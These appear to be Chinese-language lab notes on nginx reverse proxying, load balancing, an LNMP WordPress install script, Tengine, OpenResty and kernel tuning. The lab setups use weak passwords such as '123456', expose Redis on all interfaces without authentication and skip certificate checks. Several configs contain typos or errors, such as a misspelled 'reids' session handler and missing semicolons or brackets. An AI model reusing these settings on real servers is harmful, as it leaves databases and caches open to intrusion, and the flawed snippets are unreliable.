#1.添加自定义httpd自定义日志格式
[root@web2 html]# yum -y install httpd
[root@web2 html]# vim /etc/httpd/conf/httpd.conf
199     LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" \"%{X-Real-IP}i\" " combined    #添加\"%{X-Real-IP}i\"
[root@web2 html]# systemctl restart httpd




#2.查看日志
[root@web2 html]# tail -f /var/log/httpd/access_log
#10.0.0.7才是真正的客户端地址
10.0.0.67 - - [28/Jun/2022:14:23:34 +0000] "HEAD /a.png HTTP/1.0" 200 - "-" "curl/7.29.0" "10.0.0.7" 
```

**多级代理实现客户端 IP 透传**

![1656426729379](linux体系.assets/1656426729379.png)

**10.0.0.8**

```
#1.开启子配置文件转发功能
[root@proxy ~]# vim /apps/nginx/conf.d/pc.conf
server {
      listen 80;
      server_name www.liusenbiao.org;
      root /data/nginx/html/pc/;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      
    location / {
       root /data/nginx/html/pc/;
       proxy_pass http://10.0.0.18;
   }



#2.开启x_forwarded_for
http {
    include       mime.types;
    proxy_cache_path /data/nginx/proxycache levels=1:1:1 keys_zone=proxycache:20m  inactive=120s max_size=1g;
    include       /apps/nginx/conf.d/*.conf;
    default_type  application/octet-stream;
    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';  #开启x_forwarded_for
}

[root@proxy ~]# nginx -s reload
```

**10.0.0.18**

```
#1.开启子配置文件转发功能
root@web1:/apps/nginx/conf.d# vim /apps/nginx/conf.d/pc.conf
root@web1:/apps/nginx/conf.d# vim pc.conf

server {
      listen 80;
      server_name www.liusenbiao.org;
      root /data/nginx;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

    location / {
       proxy_pass http://10.0.0.28;
   }
}




#2.开启x_forwarded_for
http {
    include       mime.types;
    proxy_cache_path /data/nginx/proxycache levels=1:1:1 keys_zone=proxycache:20m  inactive=120s max_size=1g;
    include       /apps/nginx/conf.d/*.conf;
    default_type  application/octet-stream;
    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';  #开启x_forwarded_for
}

root@web1:/apps/nginx/conf.d# nginx -s reload
```

**10.0.0.28**

```
[root@web2 html]# tail -f /var/log/httpd/access_log 

#从客户端10.0.0.7发出请求，经过了10.0.0.8的代理服务器
10.0.0.18 - - [28/Jun/2022:15:40:29 +0000] "HEAD /a.png HTTP/1.0" 200 - "-" "curl/7.29.0" "10.0.0.7, 10.0.0.8" 
```

##### 41.7.1.8 http upstream配置参数

```
#自定义一组服务器，配置在http块内
upstream name { 
 server .....
 ......
}


#示例
upstream backend {
   server backend1.example.com weight=5;
   server 127.0.0.1:8080       max_fails=3 fail_timeout=30s;
   server unix:/tmp/backend3;
   server backup1.example.com backup;
}


server address [parameters];
#配置一个后端web服务器，配置在upstream内，至少要有一个server服务器配置。

#server支持的parameters如下：
weight=number #设置权重，默认为1,实现类似于LVS中的WRR,WLC等
max_conns=number  #给当前server设置最大活动链接数，默认为0表示没有限制
max_fails=number  #对后端服务器连续监测失败多少次就标记为不可用,默认为1次,当客户端访问时,才会利用TCP触发对探测后端服务器健康性检查,而非周期性的探测
fail_timeout=time #对后端服务器的单次监测超时时间，默认为10秒
backup  #设置为备份服务器，当所有服务器不可用时将重新启用次服务器
down    #标记为down状态,不去访问这个服务器
resolve #当server定义的是主机名的时候，当A记录发生变化会自动应用新IP而不用重启Nginx


hash KEY [consistent];
#基于指定请求报文中首部字段或者URI等key做hash计算，使用consistent参数，将使用ketama一致性
hash算法，适用于后端是Cache服务器（如varnish）时使用，consistent定义使用一致性hash运算，一致性hash基于取模运算
hash $request_uri consistent; #基于用户请求的uri做hash
hash $cookie_sessionid  #基于cookie中的sessionid这个key进行hash调度,实现会话绑定
hash $remote_aaddr;


ip_hash;
#源地址hash调度方法，基于的客户端的remote_addr(源地址IPv4的前24位或整个IPv6地址)做hash计算，以实现会话保持


least_conn;
#最少连接调度算法，优先将客户端请求调度到当前连接最少的后端服务器,相当于LVS中的WLC
```

**一致性哈希：**

![1656517529645](linux体系.assets/1656517529645.png)

##### 41.7.1.9 后端多台web服务器

![1656494696698](linux体系.assets/1656494696698.png)

**环境准备**

```
10.0.0.8  #Nginx 代理服务器
10.0.0.18  #后端web A，Apache部署
10.0.0.28  #后端web B，Apache部署
```

**10.0.0.8：**

```
#1.修改主配置文件nginx.conf
[root@proxy ~]# vim /apps/nginx/conf/nginx.conf
http {
    upstream pc-servers {
        server 10.0.0.18:80  weight=3;
        server 10.0.0.28:80  max_conns=10;
   }
   
    upstream mobile-servers {
        server 10.0.0.7:80 max_fails=3 fail_timeout=30s;
        server 10.0.0.17:80;
   }
}




#2.修改子配置文件pc.conf
[root@proxy ~]# vim /apps/nginx/conf.d/pc.conf
server {
      listen 80;
      server_name www.liusenbiao.org;
      root /data/nginx/html/pc/;

    location / {
       root /data/nginx/html/pc/;
       proxy_pass http://pc-servers/;
   }
}

#修改子配置文件mobile.conf
server {
      listen 80;
      server_name m.liusenbiao.org;
      root /data/nginx/html/mobile/;

    location / {
       root /data/nginx/html/mobile/;
       proxy_pass http://mobile-servers/;
   }
}
[root@proxy ~]# nginx -s reload





#3.测试连接
#10.0.0.7机器上
[root@centos8 ~]# vim /etc/hosts
10.0.0.8 www.liusenbiao.org m.liusenbiao.org
#负载均衡到集群上
[18:39:35 root@centos7 ~]#curl http://www.liusenbiao.org/
10.0.0.28
[18:39:36 root@centos7 ~]#curl http://www.liusenbiao.org/
10.0.0.18
[18:39:36 root@centos7 ~]#curl http://www.liusenbiao.org/
10.0.0.28
[18:39:37 root@centos7 ~]#curl http://www.liusenbiao.org/
10.0.0.28
[18:39:38 root@centos7 ~]#curl http://www.liusenbiao.org/
10.0.0.28
[root@centos8 ~]# curl http://m.liusenbiao.org/
10.0.0.17
[root@centos8 ~]# curl http://m.liusenbiao.org/
10.0.0.7
```

**10.0.0.18：**

```
root@web1:~# cat /var/www/html/index.html
10.0.0.18
root@web1:~# curl 127.0.0.1
10.0.0.18
```

**10.0.0.28：**

```
[root@web2 ~]# echo 10.0.0.28 > /var/www/html/index.html
[root@web2 ~]# curl 10.0.0.28
10.0.0.28
```

#### 41.7.2实现 Nginx Tcp负载均衡

![1656431986989](linux体系.assets/1656431986989.png)

```
#1.概述
Nginx在1.9.0版本开始支持tcp模式的负载均衡，在1.9.13版本开始支持udp协议的负载，udp主要用于DNS的域名解析，其配置方式和指令和http 代理类似，其基于ngx_stream_proxy_module模块实现tcp负载，另外基于模块ngx_stream_upstream_module实现后端服务器分组转发、权重分配、状态监测、调度算法等高级功能。

如果编译安装,需要指定 --with-stream 选项才能支持ngx_stream_proxy_module模块





#2.tcp负载均衡配置参数
stream { #定义stream相关的服务；Context:main
   upstream backend { #定义后端服务器
       hash $remote_addr consistent; #定义调度算法
       server backend1.example.com:12345 weight=5; #定义具体server
       server 127.0.0.1:12345      max_fails=3 fail_timeout=30s;
       server unix:/tmp/backend3;
   }
   
   upstream dns {  #定义后端服务器
       server 10.0.0.1:53535;  #定义具体server
       server dns.example.com:53;
   }
   
   server { #定义server
       listen 12345; #监听IP:PORT
       proxy_connect_timeout 1s; #连接超时时间
       proxy_timeout 3s; #转发超时时间
       proxy_pass backend; #转发到具体服务器组
   }
   
   server {
       listen 127.0.0.1:53 udp reuseport;
       proxy_timeout 20s;
       proxy_pass dns;
   }
   
   server {
       listen [::1]:12345;
       proxy_pass unix:/tmp/stream.socket;
    }
}
```

##### 41.7.2.1负载均衡: MySQL和redis

![1656556889026](linux体系.assets/1656556889026.png)

**10.0.0.8:nginx**

```
#1.修改配置文件
[root@proxy ~]# vim /apps/nginx/conf/nginx.conf
stream {
    upstream mysql {
         server 10.0.0.18:3306;
         server 10.0.0.28:3306;
}
    upstream redis {
         server 10.0.0.18:6379;
         server 10.0.0.28:6379;
}
    upstream dns_servers {
         server 10.0.0.7:53;
         server 10.0.0.17:53;
}
    server {
       listen 3306;  #默认连接本机的
       proxy_pass mysql;

}
    server {
       listen 6379;  #默认连接本机的
       proxy_pass redis;
   }
    server {
       listen 53 udp;  #默认连接本机的
       proxy_pass dns_servers;
       proxy_timeout 1s;
       proxy_responses 1;  #代理服务器响应客户端期望的数据报文数
       error_log log/dns.log
       
   }
}
[root@proxy ~]# nginx -s reload




#2.测试
#10.0.0.7上
[10:34:24 root@centos7 ~]#mysql -utest -p123456 -h10.0.0.67 -e 'select @@hostname'
+------------+
| @@hostname |
+------------+
| web2       |
+------------+
[10:34:24 root@centos7 ~]#mysql -utest -p123456 -h10.0.0.67 -e 'select @@hostname'
+------------+
| @@hostname |
+------------+
| web2       |
+------------+
```

**10.0.0.18:mysql**

```
#1.安装数据库
root@web1:~# yum -y install mysql-server
root@web1:~# systemctl enable --now mysqld



#2.创建账号允许远程连接
root@web1:~# mysql -e 'create user test@"10.0.0.%" identified by "123456"'
```

**10.0.0.28:mysql**

```
#1.安装数据库
root@web2:~# yum -y install mysql-server
root@web2:~# systemctl enable --now mysqld



#2.创建账号允许远程连接
root@web1:~# mysql -e 'create user test@"10.0.0.%" identified by "123456"'
```

##### 41.7.2.2利用LNMP实现WordPress搭建

![1656585474546](linux体系.assets/1656585474546.png)

```
#!/bin/bash
#
#********************************************************************
#Author:        liusenbiao
#Date:          2022-06-30
#FileName：      lnmp.sh
#Description：   LNMP wordpress 博客系统 
#********************************************************************
SRC_DIR=/usr/local/src
NGINX_URL=http://nginx.org/download/
NGINX='nginx-1.18.0.tar.gz'
MYSQL_URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.7/
MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
PHP_URL=https://www.php.net/distributions/
PHP='php-7.4.10.tar.xz'
WORDPRESS_URL=https://cn.wordpress.org/
APP='latest-zh_CN.tar.gz'
COLOR="echo -e \\033[01;31m"
END='\033[0m'
MYSQL_ROOT_PASSWORD=123456
MYSQL_WORDPRESS_PASSWORD=123456
CPU=`lscpu| awk '/^CPU\(s\):/{print $NF}'`

${COLOR}'开始安装基于LNMP的wordpress'$END
sleep 3

install_tars (){
cd  $SRC_DIR
rpm -q wget || yum -y -q install wget
rpm -q lrzsz || yum -y install lrzsz
wget ${PHP_URL}${PHP}
wget ${MYSQL_URL}${MYSQL}
wget ${NGINX_URL}${NGINX}
wget ${WORDPRESS_URL}${APP}
}

check_file (){
cd  $SRC_DIR
$COLOR"请将相关软件放在${SRC_DIR}目录下"$END
if [ ! -e $NGINX ];then
    $COLOR"缺少${NGINX}文件"$END
        exit
elif [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
        exit
elif [ ! -e $PHP ];then
        $COLOR"缺少${PHP}文件"$END
        exit
elif [ ! -e $APP ];then
        $COLOR"缺少${APP}文件"$END
        exit
else
    $COLOR"相关文件已准备好"$END
fi
} 
install_mysql(){
    $COLOR"开始安装MySQL数据库"$END
    cd $SRC_DIR
    tar xf $MYSQL -C /usr/local/
    if [ -e /usr/local/mysql ];then
        $COLOR"数据库已存在，安装失败"$END
        exit
    fi
    MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
    ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
    chown -R  root.root /usr/local/mysql/
    id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; $COLOR"创建mysql用户"$END; }
    yum  -y -q install numactl-libs   libaio &> /dev/null

    echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/lamp.sh
    .  /etc/profile.d/lamp.sh
    cat > /etc/my.cnf <<-EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock                                                                                                   
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql 
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
    $COLOR"数据库安装完成"$END
}

install_nginx(){
   ${COLOR}"开始安装NGINX"$END
   id nginx  &> /dev/null || { useradd -s /sbin/nologin -r  nginx; $COLOR"创建nginx用户"$END; }
   $COLOR"安装nginx相关包"$END
   yum -q -y install gcc pcre-devel openssl-devel zlib-devel perl-ExtUtils-Embed git &> /dev/null
   cd $SRC_DIR
   tar xf $NGINX 
#   git clone https://github.com/openresty/echo-nginx-module.git || { $COLOR"下载NGINX第三方模块失败,退出!"$END;exit; }
   NGINX_DIR=`echo $NGINX| sed -nr 's/^(.*[0-9]).*/\1/p'`
   cd $NGINX_DIR
   ./configure --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-http_perl_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module 
   make -j $CPU && make install 
   [ $? -eq 0 ] && $COLOR"NGINX编译安装成功"$END ||  { $COLOR"NGINX编译安装失败,退出!"$END;exit; }
   [ -d /data/www ] || mkdir -pv /data/www/
   cat > /apps/nginx/conf/nginx.conf <<EOF
worker_processes  auto;
events {
    worker_connections  10240;
}
http {
    include       mime.types;
    default_type  application/octet-stream;
    server_tokens off;
    log_format  main  '\$remote_addr - \$remote_user [\$time_local] "\$request" '
    sendfile        on;
    client_max_body_size 100m;
    keepalive_timeout  65;
    server {
        listen       80 default_server;
        server_name  localhost ; 
        root /data/www ;
        access_log  logs/nginx.access.log  main;
        location / {
            root   /data/www/;
            index  index.php index.html index.htm;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
        location ~ \.php$ {
            root           /data/www;
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            fastcgi_param  SCRIPT_FILENAME  \$document_root\$fastcgi_script_name;
            include        fastcgi_params;
        }
    }
}
EOF
    echo  'PATH=/apps/nginx/sbin:$PATH' >> /etc/profile.d/lamp.sh
    cat > /usr/lib/systemd/system/nginx.service <<EOF
[Unit]
After=network.target remote-fs.target nss-lookup.target 

[Service]
Type=forking 

ExecStart=/apps/nginx/sbin/nginx

ExecReload=/apps/nginx/sbin/nginx -s reload

ExecStop=/apps/nginx/sbin/nginx -s stop

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl start nginx 
    systemctl is-active nginx &> /dev/null ||  { $COLOR"NGINX 启动失败,退出!"$END ; exit; }
    $COLOR"NGINX安装完成"
}
install_php (){
    ${COLOR}"开始安装PHP"$END
    yum -y -q  install gcc make libxml2-devel bzip2-devel libmcrypt-devel libsqlite3x-devel oniguruma-devel &>/dev/null
    cd $SRC_DIR
    tar xf $PHP
    PHP_DIR=`echo $PHP| sed -nr 's/^(.*[0-9]).*/\1/p'`
    cd $PHP_DIR
     ./configure --prefix=/apps/php74 --enable-mysqlnd --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --with-openssl    --with-zlib  --with-config-file-path=/etc --with-config-file-scan-dir=/etc/php.d --enable-mbstring --enable-xml --enable-sockets --enable-fpm --enable-maintainer-zts --disable-fileinfo
    make -j $CPU && make install 
    [ $? -eq 0 ] && $COLOR"PHP编译安装成功"$END ||  { $COLOR"PHP编译安装失败,退出!"$END;exit; }
    cp php.ini-production  /etc/php.ini
    mkdir /etc/php.d/
    cat > /etc/php.d/opcache.ini <<EOF
[opcache]
zend_extension=opcache.so               
opcache.enable=1
EOF

    cp  sapi/fpm/php-fpm.service /usr/lib/systemd/system/
    cd /apps/php74/etc
    cp  php-fpm.conf.default  php-fpm.conf
    cd  php-fpm.d/
    cp www.conf.default www.conf
    id nginx  &> /dev/null || { useradd -s /sbin/nologin -r  nginx; $COLOR"创建nginx用户"$END; }
    sed -i.bak  -e  's/^user.*/user = nginx/' -e 's/^group.*/group = nginx/' /apps/php74/etc/php-fpm.d/www.conf
    sed -i.bak 's/expose_php = On/expose_php = off/' /etc/php.ini
    sed -i.bak 's/post_max_size = 8M/post_max_size = 80M/' /etc/php.ini
    sed -i.bak 's/upload_max_filesize = 2M/upload_max_filesize = 50M/' /etc/php.ini

    systemctl daemon-reload
    systemctl start php-fpm 
    systemctl is-active  php-fpm &> /dev/null ||  { $COLOR"PHP-FPM 启动失败,退出!"$END ; exit; }
    $COLOR"PHP安装完成"

}
install_wordpress(){
    cd $SRC_DIR
    tar xf $APP  
    [ -d /data/www ] || mkdir -pv /data/www
    mv wordpress/* /data/www/
    chown -R nginx.nginx /data/www/wp-content/
    cd /data/www/
    mv wp-config-sample.php wp-config.php
    mysql -uroot -p"$MYSQL_ROOT_PASSWORD" -e "create database wordpress;grant all on wordpress.* to wordpress@'127.0.0.1' identified by '$MYSQL_WORDPRESS_PASSWORD'" &>/dev/null
    sed -i.bak -e 's/database_name_here/wordpress/' -e 's/username_here/wordpress/' -e 's/password_here/'''$MYSQL_WORDPRESS_PASSWORD'''/' -e 's/localhost/127.0.0.1/'  wp-config.php
    $COLOR"WORDPRESS安装完成"
}

install_tars

check_file

install_mysql

install_nginx

install_php

install_wordpress
```

![1656591128990](linux体系.assets/1656591128990.png)

##### 41.7.2.3利用LNMP实现可要云私有云

![1656586848643](linux体系.assets/1656586848643.png)

**环境准备**

```
10.0.0.7： Nginx,php-fpm7.4 kodbox.1.20
10.0.0.8   MYSQL8.0,Redis5.0
```

**10.0.0.7**

```
#1.准备nginx服务
[root@centos7 ~]# yum -y install nginx
[root@centos7 ~]# mkdir -pv /data/html
[root@centos7 ~]# vim /etc/nginx/conf.d/kodbox.conf
server {
   listen 80;
   server_name cloud.liusenbiao.org;
   root /data/html;
   location / {
       index index.php index.html;
}
   location ~\.php$ {
       fastcgi_pass 127.0.0.1:9000;
       fastcgi_index  index.php;
       fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
       include        fastcgi_params;

   }
}
[root@centos7 ~]# nginx -t
[root@centos7 ~]# systemctl enable --now nginx





#2.安装和配置php支持redis
[root@centos7 ~]# wget https://mirror.tuna.tsinghua.edu.cn/remi/enterprise/remi-release-7.rpm --no-check-certificate
[root@centos7 ~]# yum -y install remi-release-7.rpm
[root@centos7 ~]# yum -y install php74-php-fpm php74-php-mcrypt php74-php-mbstring php74-php-pdo php74-php-xml php74-php-mysqlnd php74-php-opcache php74-php-gd php74-php-pecl-redis5
[root@centos7 ~]# vim /etc/opt/remi/php74/php-fpm.d/www.conf
24 user = nginx
26 group = nginx

#文件最后修改下面两行
php_value[session.save_handler] = reids
php_value[session.save_path]    = "tcp://10.0.0.8:6379"
[root@centos7 ~]# systemctl enable --now php74-php-fpm.service




#3.下载可道云源码
[root@centos7 ~]# wget https://static.kodcloud.com/update/download/kodbox.1.20.zip
[root@centos7 ~]# yum -y install unzip
[root@centos7 ~]# unzip kodbox.1.20.zip -d /data/html/
[root@centos7 ~]# chown -R nginx.nginx /data/html/
```

**10.0.0.8**

```
#1.安装包
[root@centos8 ~]# yum -y install mysql-server redis
[root@centos8 ~]# systemctl enable --now mysqld



#2.创建kodbox数据库账号
#[root@centos8 ~]# mysql -e 'drop user root@"10.0.0.%"'
[root@centos8 ~]# mysql -e 'create user kodbox@"10.0.0.%" identified by "123456"'
[root@centos8 ~]# mysql -e 'create database kodbox'




#3.修改redis的配置文件
[root@centos8 ~]# sed -i 's/^bind.*/bind 0.0.0.0/' /etc/redis.conf
[root@centos8 ~]# systemctl enable --now redis
```

![1656599909563](linux体系.assets/1656599909563.png)

![1656600101314](linux体系.assets/1656600101314.png)

![1656600139279](linux体系.assets/1656600139279.png)

![1656600173577](linux体系.assets/1656600173577.png)

![1656600348632](linux体系.assets/1656600348632.png)

![1656600763445](linux体系.assets/1656600763445.png)

![1656600411451](linux体系.assets/1656600411451.png)

### 41.8Tengine版本

```
#1.介绍
Tengine是由淘宝网发起的Web服务器项目。它在Nginx的基础上，针对大访问量网站的需求，添加了很多高级功能和特性。Tengine的性能和稳定性已经在大型的网站如淘宝网，天猫商城等得到了很好的检验。它的最终目标是打造一个高效、稳定、安全、易用的Web平台。

官网：
http://tengine.taobao.org
官方文档：
http://tengine.taobao.org/documentation_cn.html
```

#### 41.8.1动态模块

```
这个模块主要是用来运行时动态加载模块，而不用每次都要重新编译Tengine.
如果你想要编译官方模块为动态模块，你需要在configure的时候加上类似这样的指令(--with-http_xxx_module),./configure --help可以看到更多的细节.
如果只想要安装官方模块为动态模块(不安装Nginx)，那么就只需要configure之后，执行 makedso_install命令.
动态加载模块的个数限制为128个.
如果已经加载的动态模块有修改，那么必须重起Tengine才会生效.
只支持HTTP模块.
模块 在Linux/FreeBSD/MacOS下测试成功.


例子:
worker_processes  1;
dso {
   load ngx_http_lua_module.so;
   load ngx_http_memcached_module.so;
}
events {
   worker_connections  1024; }
```

##### 41.8.1.1 编译安装 tengine-2.1.2

```
[root@pxc2 ~]# yum -y install gcc pcre-devel openssl-devel
[root@pxc2 ~]# useradd -r -s /sbin/nologin nginx
[root@pxc2 ~]# cd /usr/local/src
[root@pxc2 src]# wget http://tengine.taobao.org/download/tengine-2.1.2.tar.gz
[root@pxc2 src]# tar xf tengine-2.1.2.tar.gz
[root@pxc2 tengine-2.1.2]# ./configure 
--prefix=/apps/tengine-2.1.2 
--user=nginx --group=nginx 
--with-http_ssl_module 
--with-http_v2_module
--with-http_realip_module 
--with-http_stub_status_module 
--with-http_gzip_static_module
--with-pcre
[root@pxc2 tengine-2.1.2]# make && make install
[root@pxc2 tengine-2.1.2]# ln -s /apps/tengine-2.1.2/sbin/* /usr/sbin/
[root@pxc2 tengine-2.1.2]# nginx
```

![1656602229929](linux体系.assets/1656602229929.png)

##### 41.8.1.2添加lua动态模块

```
[root@pxc2 ~]# yum -y install lua-devel
[root@pxc2 tengine-2.1.2]# cd /usr/local/src/tengine-2.1.2
[root@pxc2 tengine-2.1.2]# ./configure 
--prefix=/apps/tengine-2.1.2
--user=nginx --group=nginx 
--with-http_ssl_module
--with-http_v2_module 
--with-http_realip_module 
--with-http_stub_status_module 
--with-http_gzip_static_module 
--with-pcre
--with-http_lua_module=shared

[root@pxc2 tengine-2.1.2]# make dso_install
[root@pxc2 tengine-2.1.2]# tree /apps/tengine-2.1.2/modules/
/apps/tengine-2.1.2/modules/
└── ngx_http_lua_module.so

[root@pxc2 tengine-2.1.2]# vim /apps/tengine-2.1.2/conf/nginx.conf
dso {
     load ngx_http_lua_module.so;
}
```

##### 41.8.1.3 concat模块使用

```
#1.概述
网站中的css、js等文件都是小文件，单个文件大小几k甚至几十个字节，所以文件的特点是小而多，会造成网站加载时http请求较多，且网络传输时间比较短，甚至有时候请求时间比传输时间还长，当公司网站中的这类小文件很多时，大量的http请求就会造成传输效率低，影响网站的访问速度和客户端体验，这时合并http请求就非常有必要了，concat模块就提供了合并文件http请求的功能，这个模块由淘宝开发，功能和apache的mod_concat模块类似




#2.访问方式
请求参数需要用两个问号（'？？'）例如：
http://example.com/??style1.css,style2.css,foo/style3.css

参数中某位置只包含一个‘?’，则'?'后表示文件的版本，例如：
http://example.com/??style1.css,style2.css,foo/style3.css?v=1022344




#3.编译安装concat模块
[root@pxc2 tengine-2.1.2]# cd /usr/local/src/tengine-2.1.2
[root@pxc2 tengine-2.1.2]# ./configure --prefix=/apps/tengine-2.1.2 --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-http_lua_module=shared --with-http_concat_module=shared
[root@pxc2 tengine-2.1.2]# make dso_install
[root@pxc2 tengine-2.1.2]# tree /apps/tengine-2.1.2/modules/
/apps/tengine-2.1.2/modules/
├── ngx_http_concat_module.so
└── ngx_http_lua_module.so
[root@pxc2 tengine-2.1.2]# vim /apps/tengine-2.1.2/conf/nginx.conf
dso {
     load ngx_http_lua_module.so;
     load ngx_http_concat_module.so;
}
```

### 41.9 openresty版本

![1656639812444](linux体系.assets/1656639812444.png)

```
#1.概述
Nginx 是俄罗斯人发明的，Lua是巴西几个教授发明的，中国人章亦春把 LuaJIT VM嵌入到Nginx中，实现了OpenResty这个高性能服务端解决方案。

OpenResty是一个基于Nginx与lua的高性能Web平台，其内部集成了大量精良的Lua库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web服务和动态网关。

OpenResty 通过汇聚各种设计精良的Nginx模块（主要由 OpenResty 团队自主开发），从而将Nginx有效地变成一个强大的通用 Web 应用平台。这样，Web开发人员和系统工程师可以使用Lua脚本语言调动Nginx支持的各种 C 以及 Lua 模块，快速构造出足以胜任 10K 乃至 1000K 以上单机并发连接的高性能 Web 应用系统。

OpenResty的目标是让你的Web服务直接跑在Nginx服务内部，充分利用 Nginx的非阻塞 I/O 模型，不仅仅对HTTP客户端请求,甚至于对远程后端诸如 MySQL、PostgreSQL、Memcached 以及Redis 等都进行一致的高性能响应。

官网: http://openresty.org/cn/




2. 编译安装openresty
[root@centos8 ~]# dnf -y install gcc pcre-devel openssl-devel
[root@centos8 ~]# useradd -r -s /sbin/nologin nginx
[root@centos8 src]# wget https://openresty.org/download/openresty-1.19.3.2.tar.gz
[root@centos8 src]# tar xf openresty-1.19.3.2.tar.gz
[root@centos8 src]# cd openresty-1.19.3.2/
[root@centos8 openresty-1.19.3.2]# ./configure --prefix=/apps/openresty --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module
[root@centos8 openresty-1.19.3.2]# make && make install
[root@centos8 openresty-1.19.3.2]# ln -s /apps/openresty/bin/* /usr/bin/
[root@centos8 openresty-1.19.3.2]# openresty -v
nginx version: openresty/1.19.3.2
```

![1656640984825](linux体系.assets/1656640984825.png)

### 41.10系统参数优化

默认的Linux内核参数考虑的是最通用场景，不符合用于支持高并发访问的Web服务器的定义，根据业务特点来进行调整，当Nginx作为静态web内容服务器、反向代理或者提供压缩服务器的服务器时，内核参数的调整都是不同的，此处针对最通用的、使Nginx支持更多并发请求的TCP网络参数做简单的配置

#### 41.10.1优化内核参数

```
修改/etc/sysctl.conf
fs.file-max = 1000000
#表示单个进程较大可以打开的句柄数

net.ipv4.tcp_tw_reuse = 1
#参数设置为 1 ，表示允许将TIME_WAIT状态的socket重新用于新的TCP链接，这对于服务器来说意义重大，因为总有大量TIME_WAIT状态的链接存在

net.ipv4.tcp_keepalive_time = 600
#当keepalive启动时，TCP发送keepalive消息的频度;默认是2小时，将其设置为10分钟，可更快的清理无效链接

net.ipv4.tcp_fin_timeout = 30
#当服务器主动关闭链接时，socket保持在FIN_WAIT_2状态的较大时间

net.ipv4.tcp_max_tw_buckets = 5000
#表示操作系统允许TIME_WAIT套接字数量的较大值，如超过此值，TIME_WAIT套接字将立刻被清除并打印警告信息,默认为8000，过多的TIME_WAIT套接字会使Web服务器变慢

net.ipv4.ip_local_port_range = 1024 65000
#定义UDP和TCP链接的本地端口的取值范围

net.ipv4.tcp_rmem = 10240 87380 12582912
#定义了TCP接受缓存的最小值、默认值、较大值

net.ipv4.tcp_wmem = 10240 87380 12582912
#定义TCP发送缓存的最小值、默认值、较大值

net.core.netdev_max_backlog = 8096
#当网卡接收数据包的速度大于内核处理速度时，会有一个列队保存这些数据包。这个参数表示该列队的较大值

net.core.rmem_default = 6291456
#表示内核套接字接受缓存区默认大小

net.core.wmem_default = 6291456
#表示内核套接字发送缓存区默认大小

net.core.rmem_max = 12582912
#表示内核套接字接受缓存区较大大小

net.core.wmem_max = 12582912
#表示内核套接字发送缓存区较大大小
注意：以上的四个参数，需要根据业务逻辑和实际的硬件成本来综合考虑

net.ipv4.tcp_syncookies = 1 
#与性能无关。用于解决TCP的SYN攻击

net.ipv4.tcp_max_syn_backlog = 8192
#这个参数表示TCP三次握手建立阶段接受SYN请求列队的较大长度，默认1024，将其设置的大一些可使出现Nginx繁忙来不及accept新连接时，Linux不至于丢失客户端发起的链接请求

net.ipv4.tcp_tw_recycle = 1 
#这个参数用于设置启用timewait快速回收

net.core.somaxconn=262114
#选项默认值是128，这个参数用于调节系统同时发起的TCP连接数，在高并发的请求中，默认的值可能会导致链接超时或者重传，因此需要结合高并发请求数来调节此值。

net.ipv4.tcp_max_orphans=262114
#选项用于设定系统中最多有多少个TCP套接字不被关联到任何一个用户文件句柄上。如果超过这个数字，孤立链接将立即被复位并输出警告信息。这个限制指示为了防止简单的DOS攻击，不用过分依靠这个限制甚至认为的减小这个值，更多的情况是增加这个值
```

#### 41.10.2 PAM资源限制优化

```
在/etc/security/limits.conf 最后增加：
#不过此项优化对nginx不起作用
* soft nofile 65535
* hard nofile 65535
* soft nproc 65535
* hard nproc 65535




#要想对nginx起作用做以下配置
#要修改启动文件
[root@centos7 ~]# vim /usr/lib/systemd/system/nginx.service
[Unit]
Description=The nginx HTTP and reverse proxy server
After=network-online.target remote-fs.target nss-lookup.target
Wants=network-online.target

[Service]
Type=forking
PIDFile=/var/run/nginx.pid
ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID
LimitNOFILE=100000   #添加这一行，支持高并发

[Install
WantedBy=multi-user.target
